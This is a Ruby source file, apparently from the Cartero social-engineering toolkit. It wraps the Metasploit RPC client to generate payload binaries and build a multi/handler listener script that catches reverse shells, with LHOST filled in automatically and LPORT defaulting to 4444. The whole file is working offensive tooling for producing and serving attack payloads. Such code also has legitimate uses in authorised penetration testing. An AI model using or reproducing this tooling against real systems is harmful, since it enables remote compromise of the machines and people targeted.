require 'command_line_reporter'
require 'msfrpc-client'

module Cartero
class Metasploit
  include CommandLineReporter 

  def initialize(options={})
    @options = options
    @client = Msf::RPC::Client.new(:host=>@options["host"] || "192.168.1.216", :port=>@options["port"] || "4567")
  end

  def login(u=nil,p=nil)
    @client.login(u || @options["username"], p || @options["password"])
  end

  def call(*args)
    @client.call(*args)
  end

  def info(type,name)
    call("module.info", type, name)
  end

  def generate_payload(name, options={})
    file_path = options["filepath"]
    options.delete("filepath")
    options.merge!(generate_datastore(name, options["datastore"]))
    options.delete("datastore")
    begin 
      payload = call('module.execute', "payload", name, options)["payload"]
    rescue Msf::RPC::Exception => e
      $stderr.puts e.to_s
    end
    output_stream = File.open(file_path, "w")
    output_stream.binmode
    output_stream.write payload
  end

  def list(cmd)
    t = []
    case cmd
    when "encoders"
      call("module.encoders")["modules"].each { |x| t << info("encoders", x).merge({:path => x }) }
      display_list(t)
    when "nops"
      call("module.nops")["modules"].each { |x| t << info("nops", x).merge({:path => x }) }
      display_list(t)
    when "payloads"
      call("module.payloads")["modules"].each { |x| t << info("payloads", x).merge({:path => x }) }
      display_list(t)
    else
      raise StandardError, "Not a valid module."
    end
  end

  def generate_listener_script(payload, ds)
    datastore = generate_datastore(payload, ds)
    return "use exploit/multi/handler\n" +
           "set PAYLOAD #{payload}\n" +
           "set LHOST #{datastore['LHOST']}\n" +
           "set LPORT #{datastore['LPORT'] || "4444"}\n" +
           "set ExitOnSession false\n" +
           "exploit -j\n"
  end

  private
  def generate_datastore(payload, ds)
    datastore = {}
    ds.split(" ").each do |x|
      k,v = x.split('=', 2)
      datastore[k.upcase] = v.to_s
    end
    if payload.to_s =~ /[\_\/]reverse/ and datastore['LHOST'].nil?
      datastore['LHOST'] = local_ip
    end
    return datastore
  end

  def local_ip
    require 'socket'
    orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true
   
    UDPSocket.open do |s|
      s.connect '64.233.187.99', 1
      s.addr.last
    end
  ensure
    Socket.do_not_reverse_lookup = orig
  end

  def display_list(c)
    return if c.empty?
    table() do
      row(:header => true, :bold => true) do
        column('NAME',      :width => 50)
        column('SHORT DESCRIPTION',:width => 100)
      end
      c.each_with_index do |p|
        row() do
          column(p[:path], :color => "blue")
          column(p["description"].strip.split("\n")[0])
        end
      end
    end
  end
end
end